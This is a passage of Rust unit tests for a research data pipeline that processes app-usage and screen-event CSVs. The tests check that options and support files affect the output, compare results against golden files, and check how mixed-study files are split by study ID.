        assert_eq!(full.compliance_csv_bytes, wide.compliance_csv_bytes);
    }

    /// The support files, session-mode flags, and threshold knobs above are
    /// not decoration: flipping any one of them must move the emitted product
    /// bytes. Without this, a golden could stay green while an option stopped
    /// reaching the pipeline at all.
    #[test]
    fn every_contract_option_and_support_file_changes_the_emitted_output() {
        let baseline = run_contract_fixture();
        let baseline_bytes = |result: &PipelineV2Result| {
            (
                result.app_csv_bytes.to_vec(),
                result.screen_csv_bytes.to_vec(),
                result.credited_app_csv_bytes.to_vec(),
                result.day_coverage_csv_bytes.to_vec(),
                result.compliance_csv_bytes.to_vec(),
            )
        };
        let baseline_output = baseline_bytes(&baseline);

        #[allow(clippy::type_complexity)]
        let perturbations: Vec<(&str, Box<dyn Fn(&mut PipelineV2Options)>)> = vec![
            (
                "use_filter_file",
                Box::new(|options: &mut PipelineV2Options| options.use_filter_file = false),
            ),
            (
                "use_apps_forcing_screen_open",
                Box::new(|options: &mut PipelineV2Options| {
                    options.use_apps_forcing_screen_open = false
                }),
            ),
            (
                "use_background_apps_file",
                Box::new(|options: &mut PipelineV2Options| {
                    options.use_background_apps_file = false
                }),
            ),
            (
                "use_app_codebook",
                Box::new(|options: &mut PipelineV2Options| options.use_app_codebook = false),
            ),
            (
                "include_category_column",
                Box::new(|options: &mut PipelineV2Options| options.include_category_column = false),
            ),
            (
                "enable_person_attribution",
                Box::new(|options: &mut PipelineV2Options| {
                    options.enable_person_attribution = false
                }),
            ),
            (
                "enable_day_coverage",
                Box::new(|options: &mut PipelineV2Options| options.enable_day_coverage = false),
            ),
            (
                "enable_compliance_scoring",
                Box::new(|options: &mut PipelineV2Options| {
                    options.enable_compliance_scoring = false
                }),
            ),
            (
                "enable_screen_gated_crediting",
                Box::new(|options: &mut PipelineV2Options| {
                    options.enable_screen_gated_crediting = false
                }),
            ),
            (
                "correct_duplicate_event_timestamps",
                Box::new(|options: &mut PipelineV2Options| {
                    options.correct_duplicate_event_timestamps = false
                }),
            ),
            (
                "use_activity_stopped_as_fallback",
                Box::new(|options: &mut PipelineV2Options| {
                    options.use_activity_stopped_as_fallback = false
                }),
            ),
            (
                "model_concurrent_usage",
                Box::new(|options: &mut PipelineV2Options| options.model_concurrent_usage = false),
            ),
            (
                "minimum_usage_duration",
                Box::new(|options: &mut PipelineV2Options| options.minimum_usage_duration = 240.0),
            ),
            (
                "long_data_time_gap_thresholds",
                Box::new(|options: &mut PipelineV2Options| {
                    options.long_data_time_gap_thresholds = vec![48.0]
                }),
            ),
            (
                "long_usage_duration_thresholds",
                Box::new(|options: &mut PipelineV2Options| {
                    options.long_usage_duration_thresholds = vec![48.0]
                }),
            ),
            (
                "custom_app_engagement_duration",
                Box::new(|options: &mut PipelineV2Options| {
                    options.custom_app_engagement_duration = 45.0
                }),
            ),
            (
                "screen_auto_lock_timeout_seconds",
                Box::new(|options: &mut PipelineV2Options| {
                    options.screen_auto_lock_timeout_seconds = 3_600.0
                }),
            ),
            (
                "study_name",
                Box::new(|options: &mut PipelineV2Options| {
                    options.study_name = "Other Study".into()
                }),
            ),
        ];
        for (name, perturb) in perturbations {
            let mut options = contract_options();
            perturb(&mut options);
            let perturbed =
                run_pipeline_v2_with_supports(FIXTURE_CSV.as_bytes(), &options, support_files())
                    .unwrap_or_else(|error| panic!("{name} perturbation must still run: {error}"));
            assert_ne!(
                baseline_output,
                baseline_bytes(&perturbed),
                "changing {name} left every product output identical",
            );
        }

        // Each support file must reach the pipeline through the support struct.
        #[allow(clippy::type_complexity)]
        let support_roles: [(&str, fn(&mut PipelineV2SupportFiles<'static>)); 4] = [
            ("filter_csv", |support| support.filter_csv = b""),
            ("apps_forcing_csv", |support| support.apps_forcing_csv = b""),
            ("background_apps_csv", |support| {
                support.background_apps_csv = b""
            }),
            ("codebook_csv", |support| support.codebook_csv = b""),
        ];
        for (name, clear) in support_roles {
            let mut support = support_files();
            clear(&mut support);
            let perturbed =
                run_pipeline_v2_with_supports(FIXTURE_CSV.as_bytes(), &contract_options(), support)
                    .unwrap_or_else(|error| panic!("{name} removal must still run: {error}"));
            assert_ne!(
                baseline_output,
                baseline_bytes(&perturbed),
                "removing {name} left every product output identical",
            );
        }
    }

    #[test]
    fn product_csv_and_json_outputs_are_exact() {
        let result = run_contract_fixture();
        assert_golden("app.csv", &result.app_csv_bytes.to_vec());
        assert_golden("screen.csv", &result.screen_csv_bytes.to_vec());
        assert_golden("credited_app.csv", &result.credited_app_csv_bytes.to_vec());
        assert_golden("day_coverage.csv", &result.day_coverage_csv_bytes.to_vec());
        assert_golden("compliance.csv", &result.compliance_csv_bytes.to_vec());
        assert_golden("review_summary.json", &result.review_summary_json_bytes.to_vec());
        assert_golden(
            "visualization_data.json",
            &result.visualization_data_json_bytes.to_vec(),
        );
        let kinds = result
            .aggregate_csv_outputs
            .iter()
            .map(|output| output.kind.clone())
            .collect::<Vec<_>>();
        assert_golden("aggregate_kinds.json", format!("{kinds:?}").as_bytes());
        for output in result.aggregate_csv_outputs.iter() {
            assert_golden(&format!("{}.csv", output.kind), &output.bytes.to_vec());
        }
    }

    #[test]
    fn query_digests_and_row_lineage_are_exact() {
        let result = run_contract_fixture();
        assert_golden(
            "workflow_query_digests.json",
            serde_json::to_string_pretty(&result.workflow_query_digests)
                .expect("step digests serialize")
                .as_bytes(),
        );
        assert_golden(
            "workflow_query_checkpoints.json",
            serde_json::to_string_pretty(&result.workflow_query_checkpoints)
                .expect("query checkpoints serialize")
                .as_bytes(),
        );
        assert_golden(
            "workflow_query_group_checkpoints.json",
            serde_json::to_string_pretty(&result.workflow_query_group_checkpoints)
                .expect("workflow query-group checkpoints serialize")
                .as_bytes(),
        );
        assert_golden(
            "row_lineage.json",
            serde_json::to_string_pretty(&result.row_lineage)
                .expect("row lineage serializes")
                .as_bytes(),
        );
    }

    #[test]
    fn reported_counts_and_timezone_resolution_are_exact() {
        let result = run_contract_fixture();
        assert_golden(
            "counts.json",
            serde_json::to_string_pretty(&serde_json::json!({
                "originalRowCount": result.original_row_count,
                "processedRowCount": result.processed_row_count,
                "appRowCount": result.app_row_count,
                "screenRowCount": result.screen_row_count,
                "dayCoverageRowCount": result.day_coverage_row_count,
                "complianceRowCount": result.compliance_row_count,
                "creditedAppRowCount": result.credited_app_row_count,
                "duplicateTimestampsCorrected": result.duplicate_timestamps_corrected,
                "exactDuplicateRowsRemoved": result.exact_duplicate_rows_removed,
                "availableTimezones": result.available_timezones,
                "timezone": result.timezone,
                "timezoneAction": result.timezone_action,
                "rowsBeforeTimezoneHandling": result.rows_before_timezone_handling,
                "rowsAfterTimezoneHandling": result.rows_after_timezone_handling,
                "rowsRemovedByTimezone": result.rows_removed_by_timezone,
                "timezoneRetainedSourceRowsDigest": result.timezone_retained_source_rows_digest,
                "timezoneStageDigest": result.timezone_stage_digest,
                "workflowQueryGroupDigests": result.workflow_query_group_digests,
            }))
            .expect("counts serialize")
            .as_bytes(),
        );
    }
}

#[cfg(test)]
mod study_split {
    use super::*;

    const MIXED: &str = concat!(
        "study_id,participant_id,note,interaction_type,app_package_name,event_timestamp,timezone\n",
        "A,P01,\"a, quoted\nnote\",Activity Resumed,pkg,2026-03-07 10:00:00,UTC\n",
        "B,P01,x,Activity Paused,pkg,2026-03-07 10:05:00,UTC\n",
        ",P01,y,Activity Resumed,pkg,2026-03-07 10:06:00,UTC\n",
        " A ,P02,z,Activity Paused,pkg,2026-03-07 10:07:00,UTC\n",
    );

    fn decoded(bytes: &[u8]) -> Vec<(String, String, String, String)> {
        incremental::decode_source_records(bytes)
            .into_iter()
            .map(|row| (row.study_id, row.participant_id, row.event_timestamp, row.interaction_type))
            .collect()
    }

    #[test]
    fn a_mixed_study_file_splits_into_parts_the_decoder_reads_back_exactly() {
        let studies = raw_study_ids_to_split(MIXED.as_bytes());
        assert_eq!(studies, ["", "A", "B"]);
        let original = decoded(MIXED.as_bytes());
        let mut reassembled = Vec::new();
        let parts = split_raw_by_study(MIXED.as_bytes());
        assert_eq!(parts.iter().map(|(study, _)| study.as_str()).collect::<Vec<_>>(), studies);
        for (study, part) in &parts {
            let rows = decoded(part);
            assert!(!rows.is_empty() && rows.iter().all(|row| row.0 == *study));
            let expected: Vec<_> = original.iter().filter(|row| row.0 == *study).cloned().collect();
            assert_eq!(rows, expected, "part {study:?} keeps its rows in source order");
            reassembled.extend(rows);
        }
        assert_eq!(reassembled.len(), original.len(), "every row lands in exactly one part");
        let part_a = String::from_utf8(parts[1].1.clone()).unwrap();
        assert!(part_a.starts_with("study_id,participant_id,note,"));
        assert!(part_a.contains("\"a, quoted\nnote\""), "columns the decoder skips are kept");
    }

    #[test]
    fn the_splitter_finds_a_padded_or_marked_study_header_the_decoder_reads() {
        for header in ["\u{feff}study_id", " study_id "] {
            let csv = format!(
                "{header},participant_id,event_timestamp\nA,P01,2026-03-07 10:00:00\nB,P01,2026-03-07 10:02:00\n"
            );
            assert_eq!(raw_study_ids_to_split(csv.as_bytes()), ["A", "B"], "{header:?}");
        }
    }

    #[test]
    fn a_single_study_file_is_never_split_and_keys_carry_the_study() {
        let single = "study_id,participant_id,event_timestamp\nA,P01,2026-03-07 10:00:00\n,P01,2026-03-07 10:01:00\n";
        assert!(split_raw_by_study(single.as_bytes()).is_empty());
        assert_eq!(
            canonical_raw_participant_keys(single.as_bytes()).into_iter().collect::<Vec<_>>(),
            [("A".to_string(), "P01".to_string())],
            "blank study cells in a single-study file belong to that study"
        );
        assert!(raw_study_ids_to_split(b"participant_id,event_timestamp\nP01,2026-03-07 10:00:00\n").is_empty());
        let keys = canonical_raw_participant_keys(MIXED.as_bytes());
        let expected = [("", "P01"), ("A", "P01"), ("A", "P02"), ("B", "P01")]
            .map(|(study, participant)| (study.to_string(), participant.to_string()));
        assert_eq!(keys.into_iter().collect::<Vec<_>>(), expected);
    }
}
